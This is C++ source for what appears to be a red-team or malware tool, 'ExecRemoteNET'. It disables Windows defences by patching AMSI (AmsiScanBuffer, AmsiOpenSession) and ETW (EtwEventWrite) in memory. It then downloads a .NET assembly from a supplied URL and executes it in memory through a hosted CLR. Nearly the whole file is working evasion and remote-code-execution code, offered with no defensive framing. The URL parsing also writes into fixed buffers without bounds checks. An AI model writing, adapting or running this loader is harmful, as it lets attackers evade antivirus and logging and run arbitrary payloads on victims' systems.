#include <fstream>
#include <vector>
#include <sstream>
#include <Windows.h>
#include <Windows.h>
#include <psapi.h>
#include <iostream>
#include <tchar.h>
#pragma comment(lib, "ntdll")
#include "stdlib.hpp"
#include "CLR.hpp"
#include "winhttp.hpp"

using namespace std;

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PS_ATTRIBUTE
{
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

void patchAMSI(OUT HANDLE& hProc) {

    void* amsiAddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");

    char amsiPatch[] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* amsiAddr_bk = amsiAddr;


    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    std::cout << "[+] Patched amsi!\n";
}

void patchAMSIOpenSession(OUT HANDLE& hProc) {

    void* amsiAddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiOpenSession");

    char amsiPatch[] = { 0x48, 0x31, 0xC0 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* amsiAddr_bk = amsiAddr;


    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    std::cout << "[+] Patched amsi open session!\n";
}

void patchETW(OUT HANDLE& hProc) {

    void* etwAddr = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWrite");

    char etwPatch[] = { 0xC3 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* etwAddr_bk = etwAddr;
    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    std::cout << "[+] Patched etw!\n";

}

void loadAMSIdll(OUT HANDLE& hProc) {

    PVOID buf;
    const char* dllPath;
    dllPath = "C:\\Windows\\System32\\amsi.dll";


    LPVOID lpAllocationStart = nullptr;
    HANDLE dllThread = NULL;
    SIZE_T szAllocationSize = strlen(dllPath);
    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

    NtAllocateVirtualMemory(hProc, &lpAllocationStart, 0, (PSIZE_T)&szAllocationSize, MEM_COMMIT, PAGE_READWRITE);
    NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)dllPath, strlen(dllPath), nullptr);
    NtCreateThreadEx(&dllThread, GENERIC_EXECUTE, NULL, hProc, lpStartAddress, lpAllocationStart, FALSE, 0, 0, 0, nullptr);

    if (dllThread == NULL) {
        std::cout << "[-] Failed to load amsi.dll\n";
    }
    else {
        WaitForSingleObject(dllThread, 1000);
    }


}

std::string read_string_from_file(const std::string& file_path) {
    const std::ifstream input_stream(file_path, std::ios_base::binary);

    if (input_stream.fail()) {
        throw std::runtime_error("Failed to open file");
    }

    std::stringstream buffer;
    buffer << input_stream.rdbuf();

    return buffer.str();
}


std::vector<unsigned char> GetPE443(LPCWSTR domain, LPCWSTR path) {

    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, domain,
            INTERNET_DEFAULT_HTTPS_PORT, 0);

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);


    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {
                    //printf("%s\n", pszOutBuffer);
                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE");
        }


        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        return PEbuf;

}


std::vector<unsigned char> GetPE_HTTPSport(LPCWSTR domain, LPCWSTR path, DWORD port) {


    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, domain,
            port, 0);

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);


    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {
                    //printf("%s\n", pszOutBuffer);
                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE");
        }


        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        return PEbuf;

}

std::vector<unsigned char> GetPE80(LPCWSTR domain, LPCWSTR path) {


    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, domain,
            INTERNET_DEFAULT_HTTP_PORT, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {
                    //printf("%s\n", pszOutBuffer);
                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE\n");
        }


        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        return PEbuf;

}

std::vector<unsigned char> GetPE_HTTPport(LPCWSTR domain, LPCWSTR path, DWORD port) {


    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // https://github.com/D1rkMtr/test/blob/main/MsgBoxArgs.exe?raw=true
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, domain,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {
                    //printf("%s\n", pszOutBuffer);
                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
                    //strcat_s(PE,sizeof pszOutBuffer,pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE\n");
        }


        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        return PEbuf;

}

int main(int argc, char* argv[])
{
    if (argc != 3){
        printf("ExecRemoteNET.exe <url> <assembly args>\n");
        return -1;
    }

    char* mode;
    bool isPatchAMSI = true;
    bool isPatchAMSIOpenSession = false;
    bool isPatchETW = true;
    bool isLoadDll = false;
    LPSTR cmd;
    HANDLE hProc = NULL;

    hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE,
        (DWORD)GetCurrentProcessId()
    );
    loadAMSIdll(hProc);
    patchETW(hProc);
    patchAMSI(hProc);
    patchAMSIOpenSession(hProc);


    printf(" ~ Execute Remote .NET Assembly ~\n");
    

    std::vector<unsigned char> bytes;
    
    char* uri = argv[1];
    char* args = argv[2];
    
    //printf("uri : %s\n", uri);
    if (!strncmp("https:", uri, 6)) {
        printf("\n[+] Loading Remote PE from %s\n", uri);
        char domain[500];
        char path[500];
        sscanf(uri, "https://%100[^/]/%500[^\n]", domain, path);
        wchar_t Wdomain[500];
        mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null
        //printf("Wdomain1 %ws\n",Wdomain);
        wchar_t Wpath[500];
        mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 
        //printf("Wpath1 %ws\n", Wpath);

        const char* invalid_characters = ":";
        char* mystring = domain;
        char* c = domain;
        int j = 0;
        while (*c)
        {
            if (strchr(invalid_characters, *c))
            {
                int i = 0;
                //printf("%c is in \"%s\"   at position  %d\n", *c, domain, j);
                char realDomain[16] = "";
                char strPort[10] = "";
                DWORD port;
                for (i = 0; i < j; i++) {
                    realDomain[i] = domain[i];
                }
                //printf("realDomain : %s\n", realDomain);
                j++;
                for (i = j; i < sizeof(domain); i++) {
                    strPort[i - j] = domain[i];
                }
                //printf("strPort  %s\n", strPort);

                wchar_t WrealDomain[50];
                mbstowcs(WrealDomain, realDomain, strlen(realDomain) + 1);//Plus null
                //printf("WrealDomain %ws\n", WrealDomain);

                port = atoi(strPort);

                //printf("Wpath %ws\n", Wpath);
                //printf("WrealDomain %ws\n", WrealDomain);
                //printf("port %d\n", port);
                bytes = GetPE_HTTPSport(WrealDomain, Wpath, port);

                goto jump;
            }
            j++;
            c++;
        }
        //printf("Wdomain : %ws\n",Wdomain);
        //printf("Wpath : %ws\n", Wpath);
        bytes = GetPE443(Wdomain, Wpath);
    }
    else if (!strncmp(uri, "http:", 5)) {
        printf("\n[+] Loading Remote PE from %s\n", uri);
        char domain[50];
        char path[500];
        sscanf(uri, "http://%50[^/]/%500[^\n]", domain, path);

        wchar_t Wdomain[50];
        mbstowcs(Wdomain, domain, strlen(domain) + 1);//Plus null
        wchar_t Wpath[500];
        mbstowcs(Wpath, path, strlen(path) + 1);//Plus null 

        const char* invalid_characters = ":";
        char* c = domain;
        int j = 0;
        while (*c)
        {
            if (strchr(invalid_characters, *c))
            {
                int i = 0;
                //printf("%c is in \"%s\"   at position  %d\n", *c, domain, j);
                char realDomain[16] = "";
                char strPort[10] = "";
                DWORD port;
                for (i = 0; i < j; i++) {
                    realDomain[i] = domain[i];
                }
                //printf("realDomain : %s\n", realDomain);

                size_t origsize = strlen(realDomain) + 1;
                const size_t newsize = 100;
                size_t convertedChars = 0;
                wchar_t WrealDomain[newsize];
                mbstowcs_s(&convertedChars, WrealDomain, origsize, realDomain, _TRUNCATE);
                //printf("WrealDomain %ws\n", WrealDomain);
                j++;
                for (i = j; i < sizeof(domain); i++) {
                    strPort[i - j] = domain[i];
                }
                //printf("strPort  %s\n", strPort);


                port = atoi(strPort);

                //printf("Wpath %ws\n", Wpath);

                //printf("port %d\n", port);
                bytes = GetPE_HTTPport(WrealDomain, Wpath, port);

                goto jump;
            }
            j++;
            c++;
        }

        //printf("Wdomain : %ws\n",Wdomain);
        //printf("Wpath   : %ws\n", Wpath);
        bytes = GetPE80(Wdomain, Wpath);


    }
    

 jump:
    if (bytes.empty())
    {
        return -1;
    }
    printf("[+] Bytes: %ld\n", bytes.size());
   
    CLRManager::CLR clr = CLRManager::CLR();
    clr.execute_assembly(bytes, args);

    return 0;
}
